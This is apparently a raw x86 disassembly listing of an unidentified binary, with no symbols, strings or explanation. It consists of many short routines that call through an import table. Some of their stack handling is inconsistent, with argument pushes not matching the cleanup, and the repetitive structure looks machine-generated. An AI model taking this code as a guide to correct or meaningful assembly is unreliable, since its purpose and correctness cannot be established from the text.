  4d10ca:	push   DWORD PTR [esi+edi*1]
  4d10cd:	add    DWORD PTR [esp],ebx
  4d10d0:	pop    DWORD PTR [ecx+edi*2]
  4d10d3:	dec    DWORD PTR [ecx]
  4d10d5:	xor    ebx,ebx
  4d10d7:	add    ebx,DWORD PTR [esi]
  4d10d9:	add    esi,0x4
  4d10dc:	add    ecx,0x4
  4d10df:	add    edx,0x4
  4d10e2:	cmp    edx,0x6ac
  4d10e8:	jne    0x4d10c8
  4d10ea:	push   eax
  4d10eb:	call   0x4d07cc
  4d10f0:	add    esp,0x4
  4d10f3:	pop    eax
  4d10f4:	add    esp,0x58
  4d10f7:	pop    ebp
  4d10f8:	ret    
  4d10f9:	add    BYTE PTR [eax],al
  4d10fb:	add    BYTE PTR [edi-0x1],bl
  4d10fe:	adc    eax,0x4d209c
  4d1103:	call   edi
  4d1105:	add    BYTE PTR [eax],al
  4d1107:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d110d:	sub    esp,0x50
  4d1110:	mov    edi,0x4d3054
  4d1115:	sbb    ecx,0xffffcee8
  4d111b:	push   edi
  4d111c:	mov    edi,0x0
  4d1121:	push   edi
  4d1122:	call   0x4d12f4
  4d1127:	add    esp,0x4
  4d112a:	pop    edi
  4d112b:	push   edi
  4d112c:	push   ecx
  4d112d:	push   DWORD PTR [edi+0x68]
  4d1130:	push   esi
  4d1131:	call   0x4d0ec0
  4d1136:	add    esp,0xc
  4d1139:	pop    edi
  4d113a:	push   edi
  4d113b:	mov    ebx,0x0
  4d1140:	push   ebx
  4d1141:	call   0x4d12f4
  4d1146:	add    esp,0x4
  4d1149:	pop    edi
  4d114a:	add    esp,0x50
  4d114d:	pop    ebp
  4d114e:	ret    
  4d114f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1155:	sub    esp,0x2c
  4d1158:	lea    esi,ds:0x4d3098
  4d115e:	sbb    ecx,0xffffffb0
  4d1161:	push   esi
  4d1162:	push   DWORD PTR [esi+0x44]
  4d1165:	push   DWORD PTR [esi+0xac]
  4d116b:	call   0x4d11f4
  4d1170:	add    esp,0x8
  4d1173:	pop    esi
  4d1174:	push   0xfffffff4
  4d1176:	call   0x4d11e8
  4d117b:	add    esp,0x4
  4d117e:	call   0x4d0f58
  4d1183:	add    esp,0x4
  4d1186:	add    esp,0x2c
  4d1189:	pop    ebp
  4d118a:	ret    
  4d118b:	add    BYTE PTR [edi-0x1],bl
  4d118e:	adc    eax,0x4d2048
  4d1193:	call   edi
  4d1195:	add    BYTE PTR [eax],al
  4d1197:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d119d:	sub    esp,0x40
  4d11a0:	lea    ecx,ds:0x4d3030
  4d11a6:	mov    DWORD PTR [ebp-0x1c],edi
  4d11a9:	push   ecx
  4d11aa:	push   DWORD PTR [ecx+0x198]
  4d11b0:	push   DWORD PTR [ecx+0x1e4]
  4d11b6:	call   0x4d0afc
  4d11bb:	add    esp,0x8
  4d11be:	pop    ecx
  4d11bf:	push   ecx
  4d11c0:	call   0x4d150c
  4d11c5:	add    esp,0x4
  4d11c8:	pop    ecx
  4d11c9:	push   ecx
  4d11ca:	push   0x0
  4d11cc:	call   0x4d06ec
  4d11d1:	add    esp,0x4
  4d11d4:	pop    ecx
  4d11d5:	add    esp,0x40
  4d11d8:	pop    ebp
  4d11d9:	ret    
  4d11da:	add    BYTE PTR [eax],al
  4d11dc:	pop    edi
  4d11dd:	call   DWORD PTR ds:0x4d2018
  4d11e3:	call   edi
  4d11e5:	add    BYTE PTR [eax],al
  4d11e7:	add    BYTE PTR [edi-0x1],bl
  4d11ea:	adc    eax,0x4d201c
  4d11ef:	call   edi
  4d11f1:	add    BYTE PTR [eax],al
  4d11f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11f9:	sub    esp,0x28
  4d11fc:	lea    edx,[esi+0xa8]
  4d1202:	cmp    edx,0x5164
  4d1208:	jb     0x4d11f7
  4d120a:	push   edx
  4d120b:	lea    eax,[edx-0x140]
  4d1211:	push   eax
  4d1212:	call   0x4d077c
  4d1217:	add    esp,0x4
  4d121a:	test   eax,eax
  4d121c:	jne    0x4d120b
  4d121e:	pop    edx
  4d121f:	push   edx
  4d1220:	push   DWORD PTR [edx+0x140]
  4d1226:	push   eax
  4d1227:	push   eax
  4d1228:	push   DWORD PTR [edx+0xe8]
  4d122e:	call   0x4d124c
  4d1233:	add    esp,0x10
  4d1236:	pop    edx
  4d1237:	push   edx
  4d1238:	mov    edx,0x0
  4d123d:	push   edx
  4d123e:	call   0x4d0758
  4d1243:	add    esp,0x4
  4d1246:	pop    edx
  4d1247:	add    esp,0x28
  4d124a:	pop    ebp
  4d124b:	ret    
  4d124c:	mov    edi,edi
  4d124e:	push   ebp
  4d124f:	mov    ebp,esp
  4d1251:	sub    esp,0x38
  4d1254:	lea    eax,[edx-0x98]
  4d125a:	xor    DWORD PTR [ebp-0x14],0xffffd4c9
  4d1261:	push   eax
  4d1262:	mov    esi,0x0
  4d1267:	push   esi
  4d1268:	call   0x4d0c9c
  4d126d:	add    esp,0x4
  4d1270:	pop    eax
  4d1271:	push   eax
  4d1272:	push   edx
  4d1273:	push   ecx
  4d1274:	call   0x4d0cb4
  4d1279:	add    esp,0x8
  4d127c:	pop    eax
  4d127d:	push   eax
  4d127e:	call   0x4d0f58
  4d1283:	add    esp,0x4
  4d1286:	pop    eax
  4d1287:	add    esp,0x38
  4d128a:	pop    ebp
  4d128b:	ret    
  4d128c:	pop    edi
  4d128d:	call   DWORD PTR ds:0x4d2024
  4d1293:	call   edi
  4d1295:	add    BYTE PTR [eax],al
  4d1297:	add    BYTE PTR [edi-0x1],bl
  4d129a:	adc    eax,0x4d2090
  4d129f:	call   edi
  4d12a1:	add    BYTE PTR [eax],al
  4d12a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12a9:	sub    esp,0x50
  4d12ac:	lea    esi,[eax-0x8c]
  4d12b2:	and    DWORD PTR [esi+0x11c],0xffffff8e
  4d12b9:	push   esi
  4d12ba:	push   edi
  4d12bb:	push   DWORD PTR [esi+0xb4]
  4d12c1:	push   edi
  4d12c2:	push   DWORD PTR [esi+0x104]
  4d12c8:	call   0x4d0ab4
  4d12cd:	add    esp,0x10
  4d12d0:	pop    esi
  4d12d1:	mov    ebx,0xfffffff4
  4d12d6:	push   ebx
  4d12d7:	call   0x4d11e8
  4d12dc:	add    esp,0x4
  4d12df:	lea    ebx,[esi-0x10]
  4d12e2:	push   ebx
  4d12e3:	call   0x4d077c
  4d12e8:	add    esp,0x4
  4d12eb:	test   eax,eax
  4d12ed:	jne    0x4d12e0
  4d12ef:	add    esp,0x50
  4d12f2:	pop    ebp
  4d12f3:	ret    
  4d12f4:	pop    edi
  4d12f5:	call   DWORD PTR ds:0x4d206c
  4d12fb:	call   edi
  4d12fd:	add    BYTE PTR [eax],al
  4d12ff:	add    BYTE PTR [edi-0x1],bl
  4d1302:	adc    eax,0x4d202c
  4d1307:	call   edi
  4d1309:	add    BYTE PTR [eax],al
  4d130b:	add    BYTE PTR [edi-0x1],bl
  4d130e:	adc    eax,0x4d2054
  4d1313:	call   edi
  4d1315:	add    BYTE PTR [eax],al
  4d1317:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d131d:	sub    esp,0x50
  4d1320:	lea    esi,ds:0x4d31a0
  4d1326:	sub    edi,0xffffffc0
  4d1329:	lea    ebx,[esi-0x1a0]
  4d132f:	push   ebx
  4d1330:	call   0x4d077c
  4d1335:	add    esp,0x4
  4d1338:	test   eax,eax
  4d133a:	jne    0x4d132a
  4d133c:	push   esi
  4d133d:	push   edx
  4d133e:	push   ebx
  4d133f:	call   0x4d0a3c
  4d1344:	add    esp,0x8
  4d1347:	pop    esi
  4d1348:	push   0x0
  4d134a:	call   0x4d12f4
  4d134f:	add    esp,0x4
  4d1352:	add    esp,0x50
  4d1355:	pop    ebp
  4d1356:	ret    
  4d1357:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d135d:	sub    esp,0x5c
  4d1360:	lea    edx,[esi-0xc0]
  4d1366:	xor    DWORD PTR [edx+0x9c],eax
  4d136c:	push   edx
  4d136d:	mov    ebx,0x0
  4d1372:	push   ebx
  4d1373:	call   0x4d118c
  4d1378:	add    esp,0x4
  4d137b:	pop    edx
  4d137c:	push   edx
  4d137d:	push   DWORD PTR [edx+0x1fc]
  4d1383:	push   DWORD PTR [edx+0x1ec]
  4d1389:	push   esi
  4d138a:	call   0x4d1460
  4d138f:	add    esp,0xc
  4d1392:	pop    edx
  4d1393:	push   edx
  4d1394:	push   0x0
  4d1396:	call   0x4d0770
  4d139b:	add    esp,0x4
  4d139e:	pop    edx
  4d139f:	add    esp,0x5c
  4d13a2:	pop    ebp
  4d13a3:	ret    
  4d13a4:	pop    edi
  4d13a5:	call   DWORD PTR ds:0x4d2070
  4d13ab:	call   edi
  4d13ad:	add    BYTE PTR [eax],al
  4d13af:	add    BYTE PTR [edi-0x1],bl
  4d13b2:	adc    eax,0x4d204c
  4d13b7:	call   edi
  4d13b9:	add    BYTE PTR [eax],al
  4d13bb:	add    BYTE PTR [edi-0x1],bl
  4d13be:	adc    eax,0x4d207c
  4d13c3:	call   edi
  4d13c5:	add    BYTE PTR [eax],al
  4d13c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13cd:	sub    esp,0x54
  4d13d0:	lea    ebx,ds:0x4d3020
  4d13d6:	sub    esi,DWORD PTR [ebp-0x54]
  4d13d9:	mov    ecx,0x0
  4d13de:	push   ecx
  4d13df:	call   0x4d0770
  4d13e4:	add    esp,0x4
  4d13e7:	push   ebx
  4d13e8:	push   eax
  4d13e9:	push   DWORD PTR [ebx+0xb0]
  4d13ef:	push   esi
  4d13f0:	call   0x4d0818
  4d13f5:	add    esp,0xc
  4d13f8:	pop    ebx
  4d13f9:	call   0x4d150c
  4d13fe:	add    esp,0x4
  4d1401:	add    esp,0x54
  4d1404:	pop    ebp
  4d1405:	ret    
  4d1406:	add    BYTE PTR [eax],al
  4d1408:	mov    edi,edi
  4d140a:	push   ebp
  4d140b:	mov    ebp,esp
  4d140d:	sub    esp,0x58
  4d1410:	mov    eax,0x4d309c
  4d1415:	sbb    ebx,0x365e
  4d141b:	push   eax
  4d141c:	push   0x0
  4d141e:	call   0x4d093c
  4d1423:	add    esp,0x4
  4d1426:	pop    eax
  4d1427:	push   eax
  4d1428:	push   esi
  4d1429:	push   edi
  4d142a:	call   0x4d12a4
  4d142f:	add    esp,0x8
  4d1432:	pop    eax
  4d1433:	push   eax
  4d1434:	mov    edx,0x0
  4d1439:	push   edx
  4d143a:	call   0x4d1300
  4d143f:	add    esp,0x4
  4d1442:	pop    eax
  4d1443:	add    esp,0x58
  4d1446:	pop    ebp
  4d1447:	ret    
  4d1448:	pop    edi
  4d1449:	call   DWORD PTR ds:0x4d2094
  4d144f:	call   edi
  4d1451:	add    BYTE PTR [eax],al
  4d1453:	add    BYTE PTR [edi-0x1],bl
  4d1456:	adc    eax,0x4d2078
  4d145b:	call   edi
  4d145d:	add    BYTE PTR [eax],al
  4d145f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1465:	sub    esp,0x1c
  4d1468:	lea    edi,ds:0x4d30e0
  4d146e:	cmp    edi,0x59c6
  4d1474:	jbe    0x4d1463
  4d1476:	push   edi
  4d1477:	push   0x0
  4d1479:	call   0x4d093c
  4d147e:	add    esp,0x4
  4d1481:	pop    edi
  4d1482:	push   edi
  4d1483:	push   DWORD PTR [edi+0x120]
  4d1489:	push   DWORD PTR [edi+0x178]
  4d148f:	push   DWORD PTR [edi+0x74]
  4d1492:	push   edx
  4d1493:	call   0x4d1318
  4d1498:	add    esp,0x10
  4d149b:	pop    edi
  4d149c:	push   edi
  4d149d:	push   0x0
  4d149f:	call   0x4d1300
  4d14a4:	add    esp,0x4
  4d14a7:	pop    edi
  4d14a8:	add    esp,0x1c
  4d14ab:	pop    ebp
  4d14ac:	ret    
  4d14ad:	add    BYTE PTR [eax],al
  4d14af:	add    BYTE PTR [edi-0x1],bl
  4d14b2:	adc    eax,0x4d2004
  4d14b7:	call   edi
  4d14b9:	add    BYTE PTR [eax],al
  4d14bb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14c1:	sub    esp,0x50
  4d14c4:	mov    ebx,0x4d3170
  4d14c9:	cmp    ebx,0x4222
  4d14cf:	jbe    0x4d14bf
  4d14d1:	mov    esi,0x0
  4d14d6:	push   esi
  4d14d7:	call   0x4d118c
  4d14dc:	add    esp,0x4
  4d14df:	push   ebx
  4d14e0:	push   DWORD PTR [ebx+0x15c]
  4d14e6:	push   DWORD PTR [ebx+0x1dc]
  4d14ec:	push   DWORD PTR [ebx+0x1f8]
  4d14f2:	call   0x4d1108
  4d14f7:	add    esp,0xc
  4d14fa:	pop    ebx
  4d14fb:	push   0x0
  4d14fd:	call   0x4d0770
  4d1502:	add    esp,0x4
  4d1505:	add    esp,0x50
  4d1508:	pop    ebp
  4d1509:	ret    
  4d150a:	add    BYTE PTR [eax],al
  4d150c:	pop    edi
  4d150d:	call   DWORD PTR ds:0x4d2038
  4d1513:	call   edi
  4d1515:	add    BYTE PTR [eax],al
  4d1517:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d151d:	sub    esp,0x28
  4d1520:	mov    ebx,0x4d31d0
  4d1525:	sbb    ecx,DWORD PTR [ebp-0x4]
  4d1528:	push   ebx
  4d1529:	push   eax
  4d152a:	push   eax
  4d152b:	push   eax
  4d152c:	call   0x4d08b0
  4d1531:	add    esp,0xc
  4d1534:	pop    ebx
  4d1535:	call   0x4d150c
  4d153a:	add    esp,0x4
  4d153d:	call   0x4d07cc
  4d1542:	add    esp,0x4
  4d1545:	add    esp,0x28
  4d1548:	pop    ebp
  4d1549:	ret    
  4d154a:	add    BYTE PTR [eax],al
  4d154c:	mov    edi,edi
  4d154e:	push   ebp
  4d154f:	mov    ebp,esp
  4d1551:	sub    esp,0x44
  4d1554:	mov    eax,0x4d3038
  4d1559:	or     edi,DWORD PTR [eax+0x34]
  4d155c:	push   eax
  4d155d:	push   DWORD PTR [eax+0x10c]
  4d1563:	push   ecx
  4d1564:	call   0x4d09a4
  4d1569:	add    esp,0x8
  4d156c:	pop    eax
  4d156d:	push   eax
  4d156e:	mov    edx,0x0
  4d1573:	push   edx
  4d1574:	call   0x4d1300
  4d1579:	add    esp,0x4
  4d157c:	pop    eax
  4d157d:	push   eax
  4d157e:	mov    edi,0x0
  4d1583:	push   edi
  4d1584:	call   0x4d0c9c
  4d1589:	add    esp,0x4
  4d158c:	pop    eax
  4d158d:	add    esp,0x44
  4d1590:	pop    ebp
  4d1591:	ret    
  4d1592:	add    BYTE PTR [eax],al
  4d1594:	pop    edi
  4d1595:	call   DWORD PTR ds:0x4d2088
  4d159b:	call   edi
  4d159d:	add    BYTE PTR [eax],al
	...
